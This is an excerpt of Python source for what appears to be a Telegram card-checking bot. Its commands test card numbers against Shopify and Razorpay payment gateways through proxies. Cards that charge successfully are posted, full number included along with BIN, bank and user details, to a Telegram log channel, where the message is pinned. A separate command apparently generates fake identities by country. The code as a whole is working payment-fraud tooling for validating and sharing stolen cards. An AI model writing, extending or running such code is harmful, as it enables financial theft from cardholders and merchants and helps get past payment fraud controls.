...
CHARGED_LOG_CHANNEL_ID  = -1004381920430
...
async def send_charged_log(card: str, result: dict, gateway: str,
                            user_id: int, user_mention: str,
                            site: str = None, proxy_used: str = None):
    if not CHARGED_LOG_CHANNEL_ID or CHARGED_LOG_CHANNEL_ID == -1000000000000:
        return
    if (result.get('status') or '').upper() != 'CHARGED':
        return
    try:
        bin_tuple = await get_bin_info(card.split('|')[0])
        brand, typ, level, bank, country, flag = bin_tuple
        ...
        bin_disp = bank_disp = country_disp = "N/A"

    response = (result.get('message') or result.get('Response') or '')[:200]
    price = result.get('price') or result.get('Price') or '-'
    proxy_line = f"\n{bs('Proxy')} ━ <code>{proxy_used}</code>" if proxy_used else ""
    site_disp = site or "N/A"

    body = pe(f"""{PE} {bs('CHARGED')}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
...
{bs('Country')} ━ <code>{country_disp}</code>
{SEP}
{bs('User')} ➛ {user_mention} (<code>{user_id}</code>)
{bs('Date')} ➛ <code>{datetime.now().strftime('%d-%m-%Y %H:%M:%S')}</code>
{SEP}
{DEV_LINE}""")
    ...
    try:
        if videos:
            sent = await client_instance.send_file(
                abs(CHARGED_LOG_CHANNEL_ID), random.choice(videos),
                caption=body, parse_mode='html', supports_streaming=True,
                buttons=HIT_BUTTON)
        else:
            sent = await client_instance.send_message(
                abs(CHARGED_LOG_CHANNEL_ID), body, parse_mode='html', buttons=HIT_BUTTON)
        try:
            await client_instance.pin_message(abs(CHARGED_LOG_CHANNEL_ID), sent.id)
        except Exception:
            pass
    except Exception as e:
        log_system("CHARGED_LOG", f"send failed: {e}", "error")
...
async def cmd_sh(event):
    ...
    try:
        ...
        if status in ("Charged", "Approved", "3DS"):
            ...
            if status == "Charged":
                asyncio.create_task(send_charged_log(
                    card, result, result.get('gateway', 'Shopify'),
                    uid, f"@{username}" if username else name,
                    site=result.get('site'), proxy_used=proxy_used))
        else:
            try:
...
async def cmd_rz(event):
    ...
    try:
        ...
        if status in ("Charged", "Approved", "3DS"):
            ...
            if status == "Charged":
                asyncio.create_task(send_charged_log(
                    card, result, result.get('Gateway', 'RazorPay'),
                    uid, f"@{username}" if username else name,
                    site="Razorpay", proxy_used=proxy_used))
        else:
            try:
        ...
        while not queue.empty():
            ...
            if status in ('Charged', 'Approved', '3DS'):
                ...
                if status == 'Charged':
                    ...
                    asyncio.create_task(send_charged_log(
                        card, result, result.get('gateway', 'Shopify'),
                        user_id, f"@{username}" if username else name,
                        site=result.get('site'), proxy_used=proxy_used))
...
async def cmd_fake(event):
    ...
    if not arg or arg.lower() == 'list':
        ...
        return await styled_reply(event, pe(
            ...
            f"💡 <b>{bs('Usage')}</b>: <code>/fake US</code> · <code>/fake list</code>"
        ))
